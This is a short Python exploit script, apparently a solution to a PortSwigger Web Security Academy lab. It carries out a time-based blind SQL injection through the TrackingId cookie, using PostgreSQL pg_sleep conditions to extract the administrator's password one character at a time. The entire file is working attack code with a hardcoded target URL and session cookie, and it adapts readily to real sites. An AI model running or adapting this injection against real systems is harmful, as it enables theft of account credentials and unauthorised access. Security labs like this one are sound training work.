#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a6600b9032c16a080e253b500290045.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():

	password = ""

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando ataque de fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Password")

	for position in range(1, 21):	#Esto hace que pruebe hasta 20 caracteres
		for character in characters:

			cookies = {
				'TrackingId': "fdDQYd0euaN829vd'||(select case when substring(password,%d,1)='%s' then pg_sleep(1.5) else pg_sleep(0) end from users where username='administrator')-- -" % (position, character),
				'session': 'BbXQwHYZxUm7EVaew4zA2uNgh4QKq8hi'
			}

			p1.status(cookies['TrackingId'])

			time_start = time.time()

			r = requests.get(main_url, cookies=cookies)

			time_end = time.time()

			if time_end - time_start > 1.5:	#Comparacion si el tiempo que tarda es mayor que 1.5 es la correcta
				password += character
				p2.status(password)
				break

if __name__ == '__main__':

	makeRequest()
